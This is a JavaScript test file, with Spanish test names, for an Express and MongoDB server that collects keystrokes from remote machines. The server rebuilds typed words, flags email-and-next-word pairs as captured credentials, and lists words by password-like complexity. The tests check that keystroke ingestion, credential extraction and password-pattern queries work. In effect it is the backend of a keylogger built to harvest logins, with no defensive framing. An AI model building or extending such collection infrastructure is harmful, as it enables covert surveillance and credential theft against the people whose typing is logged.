const mongoose = require('mongoose');
const request = require('supertest');
const express = require('express');
const { connect, disconnect, clearAll } = require('./dbHelper');

const Keystroke = require('../models/Keystroke');
const Word = require('../models/Word');
const Credential = require('../models/Credential');
const wordBuilder = require('../wordBuilder');

beforeAll(connect);
afterAll(disconnect);
afterEach(clearAll);

function createApp() {
  const app = express();
  app.use(express.json({ limit: '32kb' }));

  function parseLimit(value, fallback = 200, max = 1000) {
    const parsed = Number.parseInt(value ?? String(fallback), 10);
    if (!Number.isFinite(parsed) || parsed <= 0) return fallback;
    return Math.min(parsed, max);
  }

  function parseTimestamp(value) {
    if (value === undefined || value === null || value === '') return new Date();
    const date = new Date(value);
    if (Number.isNaN(date.getTime())) throw new Error('timestamp inválido');
    return date;
  }

  function parseDateRange(query) {
    const range = {};
    if (query.from !== undefined && query.from !== '') {
      const d = new Date(query.from);
      if (Number.isNaN(d.getTime())) throw new Error('from inválido');
      range.$gte = d;
    }
    if (query.to !== undefined && query.to !== '') {
      const d = new Date(query.to);
      if (Number.isNaN(d.getTime())) throw new Error('to inválido');
      range.$lte = d;
    }
    return range;
  }

  function buildWordMatch(query) {
    const match = {};
    if (query.host) match.host = String(query.host);
    if (query.window) match.window = String(query.window);
    const range = parseDateRange(query);
    if (Object.keys(range).length) match.timestamp = range;
    return match;
  }

  app.post('/api/keystroke', async (req, res) => {
    try {
      const { host, window, key, timestamp } = req.body || {};
      if (typeof key !== 'string' || key === '') {
        return res.status(400).json({ error: 'key requerido' });
      }
      const safeHost = typeof host === 'string' && host.trim() ? host : 'unknown';
      const safeWindow = typeof window === 'string' ? window : '';
      const safeTimestamp = parseTimestamp(timestamp);

      wordBuilder.handleKey({ host: safeHost, window: safeWindow, key, timestamp: safeTimestamp });

      const doc = await Keystroke.create({
        host: safeHost, window: safeWindow, key, timestamp: safeTimestamp
      });
      res.status(201).json({ id: doc._id });
    } catch (err) {
      res.status(400).json({ error: err.message || 'error' });
    }
  });

  app.get('/api/keystrokes', async (req, res) => {
    const q = {};
    if (req.query.host) q.host = String(req.query.host);
    const docs = await Keystroke.find(q).sort({ timestamp: -1 }).limit(parseLimit(req.query.limit, 200));
    res.json(docs);
  });

  app.get('/api/stats/top-words', async (req, res) => {
    const match = buildWordMatch(req.query);
    const limit = parseLimit(req.query.limit, 25, 500);
    const rows = await Word.aggregate([
      { $match: match },
      { $group: { _id: '$word', count: { $sum: 1 } } },
      { $sort: { count: -1, _id: 1 } },
      { $limit: limit },
      { $project: { _id: 0, word: '$_id', count: 1 } }
    ]);
    res.json(rows);
  });

  app.get('/api/stats/summary', async (req, res) => {
    const match = buildWordMatch(req.query);
    const base = Object.keys(match).length ? [{ $match: match }] : [];
    const [totals, uniqueAgg] = await Promise.all([
      Word.aggregate([...base, { $group: { _id: null, total: { $sum: 1 }, avgLen: { $avg: '$length' } } }]),
      Word.aggregate([...base, { $group: { _id: '$word' } }, { $count: 'unique' }])
    ]);
    res.json({
      totalWords: totals[0]?.total || 0,
      uniqueWords: uniqueAgg[0]?.unique || 0,
      averageLength: Math.round((totals[0]?.avgLen || 0) * 100) / 100
    });
  });

  app.get('/api/stats/credentials', async (req, res) => {
    const match = {};
    if (req.query.host) match.host = String(req.query.host);
    const docs = await Credential.find(match).sort({ timestamp: -1 }).limit(50).lean();
    res.json(docs);
  });

  app.get('/api/stats/password-patterns', async (req, res) => {
    const match = buildWordMatch(req.query);
    match.complexity = req.query.complexity ? String(req.query.complexity) : { $ne: null };
    const rows = await Word.find(match).sort({ timestamp: -1 }).limit(50).lean();
    res.json(rows);
  });

  app.post('/api/stats/flush', async (req, res) => {
    await wordBuilder.flushAll();
    res.json({ ok: true });
  });

  app.get('/api/health', (req, res) => res.json({ ok: true }));

  return app;
}

describe('API - POST /api/keystroke', () => {
  let app;
  beforeAll(() => { app = createApp(); });

  test('guarda una pulsacion y devuelve 201', async () => {
    const res = await request(app)
      .post('/api/keystroke')
      .send({ host: 'pc1', window: 'test', key: 'a', timestamp: '2026-01-01T00:00:00' });
    expect(res.status).toBe(201);
    expect(res.body.id).toBeDefined();
  });

  test('rechaza si falta key', async () => {
    const res = await request(app)
      .post('/api/keystroke')
      .send({ host: 'pc1' });
    expect(res.status).toBe(400);
  });

  test('rechaza timestamp invalido', async () => {
    const res = await request(app)
      .post('/api/keystroke')
      .send({ key: 'a', timestamp: 'no-es-fecha' });
    expect(res.status).toBe(400);
  });
});

describe('API - GET /api/keystrokes', () => {
  let app;
  beforeAll(() => { app = createApp(); });

  test('devuelve array vacio sin datos', async () => {
    const res = await request(app).get('/api/keystrokes');
    expect(res.status).toBe(200);
    expect(res.body).toEqual([]);
  });

  test('devuelve pulsaciones guardadas', async () => {
    await Keystroke.create({ host: 'pc1', window: 'w', key: 'x', timestamp: new Date() });
    const res = await request(app).get('/api/keystrokes');
    expect(res.body.length).toBe(1);
    expect(res.body[0].key).toBe('x');
  });

  test('filtra por host', async () => {
    await Keystroke.create({ host: 'pc1', window: 'w', key: 'a' });
    await Keystroke.create({ host: 'pc2', window: 'w', key: 'b' });
    const res = await request(app).get('/api/keystrokes?host=pc1');
    expect(res.body.length).toBe(1);
    expect(res.body[0].key).toBe('a');
  });
});

describe('API - estadisticas de palabras', () => {
  let app;
  beforeAll(() => { app = createApp(); });

  test('top-words con datos', async () => {
    await Word.create({ host: 'h', window: 'w', word: 'hola', length: 4 });
    await Word.create({ host: 'h', window: 'w', word: 'hola', length: 4 });
    await Word.create({ host: 'h', window: 'w', word: 'mundo', length: 5 });
    const res = await request(app).get('/api/stats/top-words?limit=10');
    expect(res.status).toBe(200);
    expect(res.body[0].word).toBe('hola');
    expect(res.body[0].count).toBe(2);
  });

  test('summary devuelve totales', async () => {
    await Word.create({ host: 'h', window: 'w', word: 'ab', length: 2 });
    await Word.create({ host: 'h', window: 'w', word: 'abcd', length: 4 });
    const res = await request(app).get('/api/stats/summary');
    expect(res.body.totalWords).toBe(2);
    expect(res.body.uniqueWords).toBe(2);
    expect(res.body.averageLength).toBe(3);
  });
});

describe('API - credenciales', () => {
  let app;
  beforeAll(() => { app = createApp(); });

  test('lista credenciales detectadas', async () => {
    await Credential.create({ host: 'h', window: 'w', email: 'a@b.com', nextWord: 'pass' });
    const res = await request(app).get('/api/stats/credentials');
    expect(res.status).toBe(200);
    expect(res.body.length).toBe(1);
    expect(res.body[0].email).toBe('a@b.com');
    expect(res.body[0].nextWord).toBe('pass');
  });
});

describe('API - patrones de contraseña', () => {
  let app;
  beforeAll(() => { app = createApp(); });

  test('filtra por complejidad', async () => {
    await Word.create({ host: 'h', window: 'w', word: 'abc123', length: 6, complexity: 'alphanumeric' });
    await Word.create({ host: 'h', window: 'w', word: 'Abc123', length: 6, complexity: 'mixed-case-num' });
    await Word.create({ host: 'h', window: 'w', word: 'normal', length: 6, complexity: null });

    const res = await request(app).get('/api/stats/password-patterns?complexity=alphanumeric');
    expect(res.body.length).toBe(1);
    expect(res.body[0].word).toBe('abc123');
  });
});

describe('API - integracion completa: teclear y leer stats', () => {
  let app;
  beforeAll(() => { app = createApp(); });

  test('teclear palabras separadas por espacio aparecen en top-words', async () => {
    const keys = 'hola mundo hola ';
    for (const ch of keys) {
      await request(app)
        .post('/api/keystroke')
        .send({ host: 'pc', window: 'w', key: ch });
    }
    await request(app).post('/api/stats/flush');

    const res = await request(app).get('/api/stats/top-words?limit=10');
    const words = res.body.map(r => r.word);
    expect(words).toContain('hola');
    expect(words).toContain('mundo');

    const hola = res.body.find(r => r.word === 'hola');
    expect(hola.count).toBe(2);
  });

  test('email + password se detectan en flujo completo', async () => {
    const keys = 'user@test.com secret123 ';
    for (const ch of keys) {
      await request(app)
        .post('/api/keystroke')
        .send({ host: 'pc', window: 'w', key: ch });
    }
    await request(app).post('/api/stats/flush');

    const res = await request(app).get('/api/stats/credentials');
    expect(res.body.length).toBeGreaterThanOrEqual(1);
    const cred = res.body.find(c => c.email === 'user@test.com');
    expect(cred).toBeDefined();
    expect(cred.nextWord).toBe('secret123');
  });
});

describe('API - health', () => {
  test('devuelve ok', async () => {
    const app = createApp();
    const res = await request(app).get('/api/health');
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(true);
  });
});
